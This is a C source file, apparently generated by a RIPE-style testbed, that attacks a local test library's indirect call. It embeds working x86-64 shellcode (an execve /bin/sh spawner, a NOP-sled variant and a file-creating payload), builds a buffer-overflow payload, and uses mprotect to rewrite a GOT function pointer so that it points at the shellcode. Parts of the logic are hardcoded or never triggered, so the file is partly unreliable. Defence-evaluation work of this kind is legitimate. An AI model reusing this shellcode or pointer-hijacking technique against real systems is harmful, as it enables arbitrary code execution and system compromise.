// Auto-generated RIPE attack for test.so
// Target: test_indirect_call at offset 0x11d4
#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
#include <setjmp.h>

// ===== RIPE Shellcode =====
static char shellcode_nonop[] = 
"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48"
"\x89\xe7\x48\x31\xd2\x6a\x3b\x58\x0f\x05";

static char shellcode_simplenop[] =
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48"
"\x89\xe7\x48\x31\xd2\x6a\x3b\x58\x0f\x05";

static char shellcode_createfile[] =
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\xeb\x18\x5f\x31\xc0\x88\x47\x14\x6a\x55\x58\x31\xf6\x66\xbe"
"\xc0\x01\x0f\x05\x31\xff\x6a\x3c\x58\x0f\x05\xe8\xe3\xff\xff"
"\xff/tmp/rip-eval/f_xxxx";

void perform_ripe_attack() {
    void *handle;
    void *func_addr;
    char stack_buffer[1024];
    char heap_buffer[1024];
    
    handle = dlopen("./test.so", RTLD_LAZY | RTLD_GLOBAL);
    if (!handle) {
        fprintf(stderr, "Error loading test.so: %s\n", dlerror());
        return;
    }
    
    // 获取目标函数地址
    void *target_func = dlsym(handle, "test_indirect_call");
    if (!target_func) {
        fprintf(stderr, "Symbol not found: test_indirect_call\n");
        return;
    }
    fprintf(stderr, "[*] Target function test_indirect_call @ %p\n", target_func);
    
    // 获取间接调用指针的地址
    void *indirect_call_ptr_addr = dlsym(handle, "indirect_call_ptr");
    if (indirect_call_ptr_addr) {
        fprintf(stderr, "[*] indirect_call_ptr addr @ %p (GOT)\n", indirect_call_ptr_addr);
        fprintf(stderr, "[*] indirect_call_ptr value = %p\n", *(void**)indirect_call_ptr_addr);
    }
    
    // ===== RIPE 攻击: 使用栈溢出覆盖关键区域 =====
    // 模拟 RIPE 的 perform_attack() 流程
    
    // 1. 准备缓冲区
    char *buffer = stack_buffer;
    size_t buffer_size = sizeof(stack_buffer);
    memset(buffer, 'A', buffer_size);
    buffer[0] = '\0';
    
    // 2. 构建 payload (RIPE 格式)
    // 选择 shellcode
    char *shellcode;
    size_t shellcode_len;
    
    if (strcmp("simplenop", "nonop") == 0) {
        shellcode = shellcode_nonop;
        shellcode_len = sizeof(shellcode_nonop) - 1;
    } else if (strcmp("simplenop", "simplenop") == 0) {
        shellcode = shellcode_simplenop;
        shellcode_len = sizeof(shellcode_simplenop) - 1;
    } else if (strcmp("simplenop", "createfile") == 0) {
        shellcode = shellcode_createfile;
        shellcode_len = sizeof(shellcode_createfile) - 1;
    } else {
        shellcode = shellcode_nonop;
        shellcode_len = sizeof(shellcode_nonop) - 1;
    }
    
    fprintf(stderr, "[*] Shellcode length: %zu bytes\n", shellcode_len);
    
    // 3. 计算 payload 大小 (buffer 到目标函数指针的偏移)
    // 目标: 覆盖 target_func 地址区域的函数指针
    size_t payload_size = buffer_size;
    char *payload = (char *)malloc(payload_size);
    if (!payload) {
        perror("malloc payload");
        return;
    }
    
    // 4. 构建 RIPE payload
    memcpy(payload, shellcode, shellcode_len);
    
    // 填充
    size_t padding = payload_size - shellcode_len - sizeof(void*) - 1;
    memset(payload + shellcode_len, 'A', padding);
    
    // 写入溢出目标 (shellcode 地址)
    void *overflow_target = (void *)buffer;
    memcpy(payload + shellcode_len + padding, &overflow_target, sizeof(void*));
    
    // Null terminator
    payload[payload_size - 1] = '\0';
    
    // 5. 执行溢出 (RIPE 风格: 使用危险函数)
    fprintf(stderr, "[*] Performing overflow using memcpy\n");
    
    // 使用 memcpy 或 strcpy 溢出 buffer
    #ifdef USE_MEMCPY
        memcpy(buffer, payload, payload_size - 1);
    #else
        strcpy(buffer, payload);  // 如果 payload 不含 null 字节
    #endif
    
    // 6. 触发被覆盖的代码指针
    // 对于 test_indirect_call: 覆盖 indirect_call_ptr
    if (indirect_call_ptr_addr) {
        // 尝试写入新的函数指针 (需要内存可写)
        // 实际上 GOT 通常是只读的, 这里演示攻击逻辑
        fprintf(stderr, "[!] Attempting to overwrite indirect_call_ptr at %p\n", indirect_call_ptr_addr);
        
        // 使用 mprotect 修改页面权限
        long page_size = sysconf(_SC_PAGESIZE);
        void *page_start = (void *)((unsigned long)indirect_call_ptr_addr & ~(page_size - 1));
        
        if (mprotect(page_start, page_size, PROT_READ | PROT_WRITE | PROT_EXEC) == 0) {
            fprintf(stderr, "[*] Made GOT page writable\n");
            // 覆盖间接调用指针为 shellcode 地址
            void (**func_ptr)(void) = (void (**)(void))indirect_call_ptr_addr;
            *func_ptr = (void (*)(void))buffer;  // 指向 shellcode
            fprintf(stderr, "[*] Overwrote indirect_call_ptr -> %p\n", buffer);
            
            // 触发间接调用
            fprintf(stderr, "[!] Triggering exploited indirect call...\n");
            // 调用 test_indirect_call 会触发被劫持的间接调用
        } else {
            perror("mprotect");
            fprintf(stderr, "[*] GOT is read-only, using function parameter injection\n");
        }
    }
    
    free(payload);
    dlclose(handle);
}

int main(int argc, char **argv) {
    fprintf(stderr, "=== RIPE Attack Generator for test.so ===\n");
    fprintf(stderr, "Target: test_indirect_call @ offset 0x11d4\n");
    fprintf(stderr, "Instruction: ff d0 (indirect call/jump)\n");
    fprintf(stderr, "Injection: simplenop\n");
    fprintf(stderr, "Technique: direct\n");
    fprintf(stderr, "========================================\n\n");
    
    perform_ripe_attack();
    return 0;
}
